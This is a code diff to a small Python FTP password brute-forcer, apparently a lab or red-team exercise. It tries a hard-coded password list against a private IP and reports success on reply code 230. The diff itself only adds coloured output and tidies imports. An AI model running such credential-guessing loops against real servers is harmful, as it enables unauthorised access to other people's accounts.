@@ -3,8 +3,10 @@
 
 import socket
 import sys
-import re
-import print_
+# import re
+# import print_
+from colorama import Fore, Back, Style
+# import colored
 
 
 IP_ADDRESS = '192.168.84.137'
@@ -55,16 +57,16 @@ passwords = ['abc', 'redteam', 'password123', 'yuck','123']
 
 # lil loop
 for password in passwords:
-    print('Trying ...')
+    print(Fore.WHITE + Style.BRIGHT+ 'Trying ...' + Style.RESET_ALL)
 
     attempt = connection(uname, password)
     # print_('...')
     # print(attempt)
     if attempt==b'230':
-        print('[*] Congrats, password is:' + password)
+        print(Fore.YELLOW +'[*] Congrats, password is:' + password)
         sys.exit(0)
     else:
-        print('sorry, sucker')
+        print('Sorry, sucker')
         print()
 
  
